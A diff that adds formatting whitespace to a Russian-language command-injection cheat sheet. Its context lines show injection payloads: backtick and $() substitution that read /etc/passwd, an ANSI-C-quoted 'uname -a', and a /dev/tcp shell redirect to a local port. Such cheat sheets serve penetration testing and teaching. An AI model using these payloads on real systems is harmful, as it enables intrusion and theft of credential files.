@@ -28,10 +28,12 @@ command1 | command2  # Pipe the output of command1 into command2
 ```
 
 * Внедрение команд с помощью обратных кавычек.
+  
   ```bash
   original_cmd_by_server `cat /etc/passwd`
   ```
 * Внедрение команд с помощью замены
+  
   ```bash
   original_cmd_by_server $(cat /etc/passwd)
   ```
@@ -58,6 +60,7 @@ command1 | command2  # Pipe the output of command1 into command2
   sh</dev/tcp/127.0.0.1/4242
   ```
 * Цитирование ANSI-C
+  
   ```powershell
   X=$'uname\x20-a'&&$X
   ```
